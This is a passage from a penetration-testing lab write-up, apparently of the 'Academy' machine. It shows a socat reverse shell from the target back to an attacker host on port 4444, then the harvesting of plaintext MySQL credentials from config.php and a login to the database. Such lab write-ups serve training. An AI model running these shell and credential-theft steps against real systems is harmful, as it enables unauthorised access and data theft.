I first upgraded the shell that I got. On the kali machine I wrote:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

and on the target machine I wrote:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.126.129:4444
```

and just like that I got a better shell:

![](attachments/Pasted%20image%2020251125160005.png)

After that I found in the `/home/grimmie` a `backup.sh` which was saying:

```bash
ww-data@academy:/home/grimmie$ cat backup.sh 
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

so I went to `/var/www/html/academy/includes` and I found these files:

![](attachments/Pasted%20image%2020251125160227.png)

I read the `config.php` which had credentials for the `mySQL` database:

```php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");


?>
```

so I logged in to the mysql data with these credentials:
```bash
mysql -u grimmie -p
```

![](attachments/Pasted%20image%2020251125160435.png)


```mysql
show databases;
```


![](attachments/Pasted%20image%2020251125160538.png)

